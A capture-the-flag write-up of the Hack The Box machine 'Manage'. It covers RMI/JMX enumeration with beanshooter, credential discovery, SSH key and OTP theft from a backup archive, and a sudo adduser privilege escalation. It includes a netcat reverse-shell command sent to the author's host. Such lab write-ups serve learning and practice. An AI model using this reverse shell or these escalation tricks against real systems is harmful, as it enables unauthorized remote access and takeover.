---
title: "HTB Manage Writeup"
date: 2025-07-31
tags:
  - HTB
  - Manage
---
# About Manage

Manage is an easy Linux machine that features an exposed `Java RMI` service. Exploiting the underlying vulnerable `JMX` service leads to remote code execution and gaining a remote shell as the `tomcat` user. Lateral movement to the `useradmin` account can be achieved by discovering a misconfigured backup archive which leaks sensitive files, including `SSH` keys and `OTP` codes. Finally, a `sudo` misconfiguration allows for creating a privileged user and achieving full privilege escalation.

# Enumeration & Initial Access

<img width="1374" height="1027" alt="2025-07-31 115048" src="https://github.com/user-attachments/assets/dfa11bf6-14f7-4637-897d-242dad506b7b" />

I started off with a scan and saw three ports, one on the standard port 22 and a non-default one on port 2222 running Java RMI. On port 8080, there was an Apache Tomcat 10 application running.

I spent some time trying to find a vulnerability in the Tomcat application. I ran ffuf with some common Tomcat wordlists but didn't find any interesting files. The /manager directory was also locked down and only accessible from a browser running on the same machine.

After hitting a dead end with the web app, I decided to take a closer look at what was running on port 2222. It turned out to be a Java RMI service. This was my first time dealing with Java RMI, so I had to do some research on how it could be exploited. I found a great resource on PayloadsAllTheThings that recommended an enumeration tool called beanshooter.

Running beanshooter was a success! It found credentials for a "manager" and an "admin" user.

<img width="1296" height="465" alt="2025-07-31 125801" src="https://github.com/user-attachments/assets/8694df6b-dc50-49c2-bfe7-79ba8ca026b0" />


Getting a Shell with Beanshooter

The same guide on PayloadsAllTheThings also showed how to get Remote Code Execution with beanshooter and the credentials I just found. I crafted the command to send a reverse shell back to my machine.
Bash

<img width="1241" height="471" alt="2025-07-31 130229" src="https://github.com/user-attachments/assets/824ece7d-4baf-4515-bb4f-e1b6dc3a3d50" />

```bash
java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.168.238 2222 exec 'busybox nc 10.10.14.139 9001 -e /bin/bash'
```

I set up a netcat listener on port 9001, ran the command, and got a reverse shell as the tomcat user.
<img width="939" height="192" alt="2025-07-31 131225" src="https://github.com/user-attachments/assets/c9176bd7-f723-4765-b17e-2bf7193d0dd8" />


### Pivoting to a User Account

After upgrading my shell to a full TTY, I started looking around and saw two user directories in /home: karl and useradmin.

In the useradmin directory, I found a backup directory containing an archive file. I didn't have permission to write, but I could read the file. I transferred it to my Kali machine using netcat to analyze it further.
<img width="1159" height="93" alt="2025-07-31 134138" src="https://github.com/user-attachments/assets/f060be31-6bc8-40b0-9392-11cd04e5826a" />

After extracting the archive, I saw it was a backup of a home directory. Inside the .ssh folder, I found a private key, id_rsa. This was exactly what I was looking for.

I tried to log in as useradmin with the private key, but it prompted me for a verification code. Luckily, the backup also contained a .google_authenticator file. I used one of the codes from it, and it worked! I was now logged in as the useradmin.
<img width="530" height="446" alt="2025-07-31 134715" src="https://github.com/user-attachments/assets/79e183f7-1eda-48e3-a293-6380f06dad63" />
<img width="1076" height="1314" alt="Снимок экрана 2025-07-31 134729" src="https://github.com/user-attachments/assets/3196a243-28e7-4159-b646-2c1fbb7e70e1" />


### Finding the User Flag

Now that I had user access, I started looking for user.txt. Strangely, it wasn't in either karl's or useradmin's home directory. I eventually found it back in the tomcat user's home directory at /opt/tomcat. After grabbing that flag, I moved on to getting root.


# Privilege Escalation to Root

I did all the usual checks for privilege escalation—looking for SUID binaries, writable directories, cron jobs—but came up empty. Finally, I ran sudo -l to see what commands useradmin could run as root, and the output was very interesting.

<img width="2190" height="171" alt="2025-07-31 140045" src="https://github.com/user-attachments/assets/87eff01a-def3-43b3-a300-c921150dbe1d" />

I could run the adduser command. The privilege escalation here is a cool trick: on some Ubuntu systems, if no admin user exists, you can create a user named "admin." That new user will automatically be placed in the powerful admin group, which has full sudo privileges.

I ran sudo adduser admin, set a password, and then switched to my new user with su admin. From there, a final sudo su gave me a root shell. Done!

<img width="1002" height="1095" alt="2025-07-31 144112" src="https://github.com/user-attachments/assets/69edf30a-677c-456f-a831-23438007daec" />
